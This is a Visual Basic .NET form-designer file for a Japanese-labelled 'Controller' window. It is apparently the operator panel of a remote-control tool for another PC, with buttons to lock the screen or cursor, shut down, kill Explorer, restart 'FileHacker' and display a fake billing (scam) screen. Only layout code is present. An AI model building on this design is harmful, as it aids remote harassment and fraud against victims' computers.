<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Controller
    Inherits System.Windows.Forms.Form

    'フォームがコンポーネントの一覧をクリーンアップするために dispose をオーバーライドします。
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Windows フォーム デザイナーで必要です。
    Private components As System.ComponentModel.IContainer

    'メモ: 以下のプロシージャは Windows フォーム デザイナーで必要です。
    'Windows フォーム デザイナーを使用して変更できます。  
    'コード エディターを使って変更しないでください。
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Button1 = New System.Windows.Forms.Button()
        Me.Button2 = New System.Windows.Forms.Button()
        Me.Button3 = New System.Windows.Forms.Button()
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.Status = New System.Windows.Forms.ToolStripStatusLabel()
        Me.StateProgress = New System.Windows.Forms.ToolStripProgressBar()
        Me.Button4 = New System.Windows.Forms.Button()
        Me.Button5 = New System.Windows.Forms.Button()
        Me.Button6 = New System.Windows.Forms.Button()
        Me.PictureSelector = New System.Windows.Forms.OpenFileDialog()
        Me.PictureUploader = New System.ComponentModel.BackgroundWorker()
        Me.Button7 = New System.Windows.Forms.Button()
        Me.CheckResponse = New System.ComponentModel.BackgroundWorker()
        Me.ResetTimer = New System.Windows.Forms.Timer(Me.components)
        Me.MusicSelector = New System.Windows.Forms.OpenFileDialog()
        Me.Button8 = New System.Windows.Forms.Button()
        Me.Button9 = New System.Windows.Forms.Button()
        Me.MusicFileUploader = New System.ComponentModel.BackgroundWorker()
        Me.ShowPayment = New System.Windows.Forms.Button()
        Me.SignalSender = New System.ComponentModel.BackgroundWorker()
        Me.Button10 = New System.Windows.Forms.Button()
        Me.Button11 = New System.Windows.Forms.Button()
        Me.Button12 = New System.Windows.Forms.Button()
        Me.Button13 = New System.Windows.Forms.Button()
        Me.Button14 = New System.Windows.Forms.Button()
        Me.Button15 = New System.Windows.Forms.Button()
        Me.Button16 = New System.Windows.Forms.Button()
        Me.Button17 = New System.Windows.Forms.Button()
        Me.Button18 = New System.Windows.Forms.Button()
        Me.Button19 = New System.Windows.Forms.Button()
        Me.StatusStrip1.SuspendLayout()
        Me.SuspendLayout()
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(5, 5)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(38, 12)
        Me.Label1.TabIndex = 0
        Me.Label1.Text = "Label1"
        '
        'Button1
        '
        Me.Button1.Location = New System.Drawing.Point(7, 21)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(75, 23)
        Me.Button1.TabIndex = 1
        Me.Button1.Text = "シャットダウン"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'Button2
        '
        Me.Button2.Location = New System.Drawing.Point(88, 21)
        Me.Button2.Name = "Button2"
        Me.Button2.Size = New System.Drawing.Size(68, 23)
        Me.Button2.TabIndex = 2
        Me.Button2.Text = "サインアウト"
        Me.Button2.UseVisualStyleBackColor = True
        '
        'Button3
        '
        Me.Button3.Location = New System.Drawing.Point(162, 21)
        Me.Button3.Name = "Button3"
        Me.Button3.Size = New System.Drawing.Size(68, 23)
        Me.Button3.TabIndex = 3
        Me.Button3.Text = "再起動"
        Me.Button3.UseVisualStyleBackColor = True
        '
        'StatusStrip1
        '
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.Status, Me.StateProgress})
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 136)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.Size = New System.Drawing.Size(492, 22)
        Me.StatusStrip1.TabIndex = 4
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'Status
        '
        Me.Status.Name = "Status"
        Me.Status.Size = New System.Drawing.Size(0, 17)
        '
        'StateProgress
        '
        Me.StateProgress.Maximum = 2
        Me.StateProgress.Name = "StateProgress"
        Me.StateProgress.Size = New System.Drawing.Size(100, 16)
        '
        'Button4
        '
        Me.Button4.Location = New System.Drawing.Point(7, 50)
        Me.Button4.Name = "Button4"
        Me.Button4.Size = New System.Drawing.Size(92, 23)
        Me.Button4.TabIndex = 5
        Me.Button4.Text = "カーソルをロック"
        Me.Button4.UseVisualStyleBackColor = True
        '
        'Button5
        '
        Me.Button5.Location = New System.Drawing.Point(105, 50)
        Me.Button5.Name = "Button5"
        Me.Button5.Size = New System.Drawing.Size(103, 23)
        Me.Button5.TabIndex = 6
        Me.Button5.Text = "カーソルをアンロック"
        Me.Button5.UseVisualStyleBackColor = True
        '
        'Button6
        '
        Me.Button6.Location = New System.Drawing.Point(7, 79)
        Me.Button6.Name = "Button6"
        Me.Button6.Size = New System.Drawing.Size(75, 23)
        Me.Button6.TabIndex = 7
        Me.Button6.Text = "壁紙の変更"
        Me.Button6.UseVisualStyleBackColor = True
        '
        'PictureSelector
        '
        Me.PictureSelector.Filter = "画像|*.jpg,*.jpeg,*.gif,*.png,*.bmp"
        Me.PictureSelector.Title = "画像を選択して下さい。"
        '
        'PictureUploader
        '
        '
        'Button7
        '
        Me.Button7.Location = New System.Drawing.Point(88, 79)
        Me.Button7.Name = "Button7"
        Me.Button7.Size = New System.Drawing.Size(75, 23)
        Me.Button7.TabIndex = 8
        Me.Button7.Text = "応答の確認"
        Me.Button7.UseVisualStyleBackColor = True
        '
        'CheckResponse
        '
        '
        'ResetTimer
        '
        Me.ResetTimer.Enabled = True
        Me.ResetTimer.Interval = 10000
        '
        'MusicSelector
        '
        Me.MusicSelector.Filter = "Music|*.wav"
        '
        'Button8
        '
        Me.Button8.Location = New System.Drawing.Point(7, 106)
        Me.Button8.Name = "Button8"
        Me.Button8.Size = New System.Drawing.Size(75, 23)
        Me.Button8.TabIndex = 9
        Me.Button8.Text = "音楽を再生"
        Me.Button8.UseVisualStyleBackColor = True
        '
        'Button9
        '
        Me.Button9.Location = New System.Drawing.Point(88, 106)
        Me.Button9.Name = "Button9"
        Me.Button9.Size = New System.Drawing.Size(75, 23)
        Me.Button9.TabIndex = 10
        Me.Button9.Text = "音楽を停止"
        Me.Button9.UseVisualStyleBackColor = True
        '
        'MusicFileUploader
        '
        '
        'ShowPayment
        '
        Me.ShowPayment.Location = New System.Drawing.Point(169, 79)
        Me.ShowPayment.Name = "ShowPayment"
        Me.ShowPayment.Size = New System.Drawing.Size(75, 50)
        Me.ShowPayment.TabIndex = 11
        Me.ShowPayment.Text = "架空請求画面を表示"
        Me.ShowPayment.UseVisualStyleBackColor = True
        '
        'SignalSender
        '
        '
        'Button10
        '
        Me.Button10.Location = New System.Drawing.Point(405, 5)
        Me.Button10.Name = "Button10"
        Me.Button10.Size = New System.Drawing.Size(68, 38)
        Me.Button10.TabIndex = 14
        Me.Button10.Text = "予約" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "再起動"
        Me.Button10.UseVisualStyleBackColor = True
        '
        'Button11
        '
        Me.Button11.Location = New System.Drawing.Point(331, 5)
        Me.Button11.Name = "Button11"
        Me.Button11.Size = New System.Drawing.Size(68, 38)
        Me.Button11.TabIndex = 13
        Me.Button11.Text = "予約" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "サインアウト"
        Me.Button11.UseVisualStyleBackColor = True
        '
        'Button12
        '
        Me.Button12.Location = New System.Drawing.Point(250, 5)
        Me.Button12.Name = "Button12"
        Me.Button12.Size = New System.Drawing.Size(75, 38)
        Me.Button12.TabIndex = 12
        Me.Button12.Text = "予約" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "シャットダウン"
        Me.Button12.UseVisualStyleBackColor = True
        '
        'Button13
        '
        Me.Button13.Location = New System.Drawing.Point(419, 49)
        Me.Button13.Name = "Button13"
        Me.Button13.Size = New System.Drawing.Size(68, 23)
        Me.Button13.TabIndex = 17
        Me.Button13.Text = "ロック解除"
        Me.Button13.UseVisualStyleBackColor = True
        '
        'Button14
        '
        Me.Button14.Location = New System.Drawing.Point(331, 49)
        Me.Button14.Name = "Button14"
        Me.Button14.Size = New System.Drawing.Size(82, 23)
        Me.Button14.TabIndex = 16
        Me.Button14.Text = "カラフルロック"
        Me.Button14.UseVisualStyleBackColor = True
        '
        'Button15
        '
        Me.Button15.Location = New System.Drawing.Point(250, 49)
        Me.Button15.Name = "Button15"
        Me.Button15.Size = New System.Drawing.Size(75, 23)
        Me.Button15.TabIndex = 15
        Me.Button15.Text = "ブラックロック"
        Me.Button15.UseVisualStyleBackColor = True
        '
        'Button16
        '
        Me.Button16.Location = New System.Drawing.Point(250, 78)
        Me.Button16.Name = "Button16"
        Me.Button16.Size = New System.Drawing.Size(92, 23)
        Me.Button16.TabIndex = 18
        Me.Button16.Text = "システムをロック"
        Me.Button16.UseVisualStyleBackColor = True
        '
        'Button17
        '
        Me.Button17.Location = New System.Drawing.Point(348, 78)
        Me.Button17.Name = "Button17"
        Me.Button17.Size = New System.Drawing.Size(139, 23)
        Me.Button17.TabIndex = 19
        Me.Button17.Text = "エクスプローラー強制終了"
        Me.Button17.UseVisualStyleBackColor = True
        '
        'Button18
        '
        Me.Button18.Location = New System.Drawing.Point(251, 106)
        Me.Button18.Name = "Button18"
        Me.Button18.Size = New System.Drawing.Size(123, 23)
        Me.Button18.TabIndex = 20
        Me.Button18.Text = "アプリケーションを起動"
        Me.Button18.UseVisualStyleBackColor = True
        '
        'Button19
        '
        Me.Button19.Location = New System.Drawing.Point(380, 106)
        Me.Button19.Name = "Button19"
        Me.Button19.Size = New System.Drawing.Size(107, 23)
        Me.Button19.TabIndex = 21
        Me.Button19.Text = "FileHacker再起動"
        Me.Button19.UseVisualStyleBackColor = True
        '
        'Controller
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 12.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(492, 158)
        Me.Controls.Add(Me.Button19)
        Me.Controls.Add(Me.Button18)
        Me.Controls.Add(Me.Button17)
        Me.Controls.Add(Me.Button16)
        Me.Controls.Add(Me.Button13)
        Me.Controls.Add(Me.Button14)
        Me.Controls.Add(Me.Button15)
        Me.Controls.Add(Me.Button10)
        Me.Controls.Add(Me.Button11)
        Me.Controls.Add(Me.Button12)
        Me.Controls.Add(Me.ShowPayment)
        Me.Controls.Add(Me.Button9)
        Me.Controls.Add(Me.Button8)
        Me.Controls.Add(Me.Button7)
        Me.Controls.Add(Me.Button6)
        Me.Controls.Add(Me.Button5)
        Me.Controls.Add(Me.Button4)
        Me.Controls.Add(Me.StatusStrip1)
        Me.Controls.Add(Me.Button3)
        Me.Controls.Add(Me.Button2)
        Me.Controls.Add(Me.Button1)
        Me.Controls.Add(Me.Label1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow
        Me.Name = "Controller"
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents Button1 As System.Windows.Forms.Button
    Friend WithEvents Button2 As System.Windows.Forms.Button
    Friend WithEvents Button3 As System.Windows.Forms.Button
    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip
    Friend WithEvents Status As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents Button4 As System.Windows.Forms.Button
    Friend WithEvents Button5 As System.Windows.Forms.Button
    Friend WithEvents Button6 As System.Windows.Forms.Button
    Friend WithEvents PictureSelector As System.Windows.Forms.OpenFileDialog
    Friend WithEvents PictureUploader As System.ComponentModel.BackgroundWorker
    Friend WithEvents Button7 As System.Windows.Forms.Button
    Friend WithEvents CheckResponse As System.ComponentModel.BackgroundWorker
    Friend WithEvents StateProgress As System.Windows.Forms.ToolStripProgressBar
    Friend WithEvents ResetTimer As System.Windows.Forms.Timer
    Friend WithEvents MusicSelector As System.Windows.Forms.OpenFileDialog
    Friend WithEvents Button8 As System.Windows.Forms.Button
    Friend WithEvents Button9 As System.Windows.Forms.Button
    Friend WithEvents MusicFileUploader As System.ComponentModel.BackgroundWorker
    Friend WithEvents ShowPayment As System.Windows.Forms.Button
    Friend WithEvents SignalSender As System.ComponentModel.BackgroundWorker
    Friend WithEvents Button10 As System.Windows.Forms.Button
    Friend WithEvents Button11 As System.Windows.Forms.Button
    Friend WithEvents Button12 As System.Windows.Forms.Button
    Friend WithEvents Button13 As System.Windows.Forms.Button
    Friend WithEvents Button14 As System.Windows.Forms.Button
    Friend WithEvents Button15 As System.Windows.Forms.Button
    Friend WithEvents Button16 As System.Windows.Forms.Button
    Friend WithEvents Button17 As System.Windows.Forms.Button
    Friend WithEvents Button18 As System.Windows.Forms.Button
    Friend WithEvents Button19 As System.Windows.Forms.Button

End Class
